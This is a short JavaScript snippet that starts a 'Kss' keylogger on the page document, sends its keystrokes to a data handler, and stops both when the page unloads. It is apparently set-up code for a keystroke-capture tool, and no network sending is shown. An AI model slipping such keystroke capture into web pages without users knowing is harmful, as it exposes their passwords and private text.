(function() {
  var data = new Kss.Data();
  var keylogger = new Kss.Keylogger(document);

  keylogger.attachListener(data.keystrokeHandler);
  data.start();
  keylogger.start();

  $(window).bind('unload', function() {
    data.stop();
    keylogger.stop();
  });
})();
